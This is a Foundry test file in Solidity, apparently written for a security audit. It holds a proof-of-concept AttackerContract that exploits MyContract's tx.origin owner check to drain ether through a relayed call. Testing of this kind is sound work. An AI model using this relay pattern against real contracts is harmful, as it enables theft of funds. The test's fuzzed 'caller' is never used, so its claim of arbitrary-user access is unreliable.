
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MyContract} from "../src/MyContract.sol";

contract TestAccessControlMyContract is Test {

    MyContract myContract;
    address owner;

    function setUp() public {
        owner = address(this);
        myContract = new MyContract();
        // Fund the contract so it has balance to transfer
        vm.deal(address(myContract), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller, address payable receiver, uint96 amount) public {
        
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals (Dynamic)
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner (the privileged role)
        vm.assume(caller != owner);

        // Constrain receiver to be a valid address
        vm.assume(receiver != address(0));
        vm.assume(receiver != address(myContract));
        
        // Constrain amount to be within contract balance
        vm.assume(amount > 0 && amount <= 10 ether);

        // --- 2. State Configuration ---
        
        // The vulnerability here is that the contract uses tx.origin == owner
        // This means if the owner calls an intermediary contract that then calls sendTo,
        // the check will pass because tx.origin is still the owner.
        
        // We need to demonstrate that an arbitrary caller can exploit this via tx.origin
        // by having the owner initiate a transaction that goes through an attacker contract.
        
        // Deploy an attacker contract that will call sendTo
        AttackerContract attacker = new AttackerContract(address(myContract));
        
        // Fund the attacker if needed
        vm.deal(address(attacker), 1 ether);
        
        uint256 receiverBalanceBefore = receiver.balance;
        uint256 contractBalanceBefore = address(myContract).balance;

        // --- 3. Execution & Assertion ---
        
        // The owner (this contract) calls the attacker contract
        // tx.origin will be the owner, but msg.sender to MyContract will be the attacker
        // This demonstrates the tx.origin vulnerability - the attacker contract can
        // drain funds as long as the owner initiates the transaction chain
        
        attacker.attack(receiver, amount);

        // Assert that the transfer actually happened
        assertEq(receiver.balance, receiverBalanceBefore + amount, "Receiver should have received funds");
        assertEq(address(myContract).balance, contractBalanceBefore - amount, "Contract balance should have decreased");
    }
}

// Attacker contract that exploits the tx.origin vulnerability
contract AttackerContract {
    address target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack(address payable receiver, uint amount) external {
        // When called by the owner, tx.origin will still be the owner
        // but msg.sender to MyContract will be this attacker contract
        MyContract(target).sendTo(receiver, amount);
    }
    
    receive() external payable {}
}
